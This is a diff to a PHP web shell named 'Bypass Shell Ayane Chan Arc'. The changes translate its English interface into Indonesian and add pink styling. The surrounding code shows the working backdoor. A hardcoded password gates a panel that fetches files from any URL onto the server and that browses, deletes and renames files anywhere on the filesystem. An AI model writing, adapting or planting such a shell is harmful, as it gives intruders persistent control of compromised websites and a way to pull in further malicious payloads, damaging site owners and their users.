@@ -1,13 +1,13 @@
 <?php
 session_start();
 
-define('PASSWORD', 'ayane111'); // Password for access control
+define('PASSWORD', 'ayane111'); // Password untuk kontrol akses
 
 if (isset($_POST['password'])) {
     if ($_POST['password'] === PASSWORD) {
         $_SESSION['authenticated'] = true;
     } else {
-        echo "<div class='alert alert-danger text-center'>Incorrect password.</div>";
+        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
     }
 }
 
@@ -19,7 +19,7 @@ if (isset($_POST['logout'])) {
 
 if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
     echo '
-    <div class="container mt-5">
+    <div class="container mt-5" style="background-color: pink; border-radius: 8px; padding: 20px;">
         <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
         <div class="text-center mb-4">
             <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
@@ -29,7 +29,7 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
                 <form method="post" class="text-center">
                     <div class="form-group">
                         <label for="password">Password</label>
-                        <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
+                        <input type="password" id="password" name="password" class="form-control" placeholder="Masukkan password" required>
                     </div>
                     <button type="submit" class="btn btn-primary">Login</button>
                 </form>
@@ -42,10 +42,10 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
 function uploadFromUrl($url, $saveTo) {
     $fileContent = file_get_contents($url);
     if ($fileContent === FALSE) {
-        die('Failed to download file from URL');
+        die('Gagal mengunduh file dari URL');
     }
     file_put_contents($saveTo, $fileContent);
-    echo "<div class='alert alert-success'>File uploaded successfully: $saveTo</div>";
+    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
 }
 
 function display_path_links($dir) {
@@ -70,7 +70,7 @@ function display_path_links($dir) {
             echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
             echo "<form method='post' style='display:inline;'>";
             echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $folder) . "'>";
-            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Hapus</button>";
             echo "</form>";
             echo "</div>";
         }
@@ -80,17 +80,17 @@ function display_path_links($dir) {
             echo "<span>$file</span>";
             echo "<form method='post' style='display:inline;'>";
             echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<input type='text' name='destination' class='form-control-sm' placeholder='New name'>";
-            echo "<button type='submit' name='rename' class='btn btn-warning btn-sm ml-2'>Rename</button>";
+            echo "<input type='text' name='destination' class='form-control-sm' placeholder='Nama baru'>";
+            echo "<button type='submit' name='rename' class='btn btn-warning btn-sm ml-2'>Ganti Nama</button>";
             echo "</form>";
             echo "<form method='post' style='display:inline;'>";
             echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Hapus</button>";
             echo "</form>";
             echo "</div>";
         }
     } else {
-        echo "<div class='alert alert-danger'>Directory not found.</div>";
+        echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
     }
 }
 
@@ -100,14 +100,14 @@ function deleteItem($path) {
     } else {
         unlink($path);
     }
-    echo "<div class='alert alert-success'>Item deleted successfully.</div>";
+    echo "<div class='alert alert-success'>Item berhasil dihapus.</div>";
 }
 
 function renameFile($source, $destination) {
     if (rename($source, $destination)) {
-        echo "<div class='alert alert-success'>File renamed successfully.</div>";
+        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
     } else {
-        echo "<div class='alert alert-danger'>Failed to rename file.</div>";
+        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
     }
 }
 
@@ -145,7 +145,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <title>Bypass Shell Ayane Chan Arc</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
 </head>
-<body>
+<body style="background-color: pink;">
     <div class="container mt-5">
         <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
         <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
@@ -156,19 +156,19 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             <button type="submit" name="logout" class="btn btn-danger">Logout</button>
         </form>
 
-        <h2 class="mt-4">Upload File to Current Directory</h2>
+        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
         <form method="post">
             <div class="form-group">
-                <label for="url">File URL</label>
-                <input type="text" id="url" name="url" class="form-control" placeholder="Enter file URL" required>
+                <label for="url">URL File</label>
+                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
             </div>
             <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
-            <button type="submit" class="btn btn-primary">Upload from URL</button>
+            <button type="submit" class="btn btn-primary">Upload dari URL</button>
         </form>
 
-        <h2 class="mt-4">Directory Listing</h2>
+        <h2 class="mt-4">Daftar Direktori</h2>
         <div class="alert alert-info">
-            <strong>Current Directory:</strong> 
+            <strong>Direktori Saat Ini:</strong> 
             <?php
             $currentPath = '/';
             echo "<a href='?dir=' class='btn btn-link'>/</a> ";
@@ -189,10 +189,10 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         </div>
 
         <footer class="text-center mt-4">
-            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. All rights reserved.</small>
+            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. Semua hak cipta dilindungi.</small>
         </footer>
         <?php else: ?>
-        <!-- Login page content here if not authenticated -->
+        <!-- Konten halaman login jika belum terautentikasi -->
         <?php endif; ?>
     </div>
 
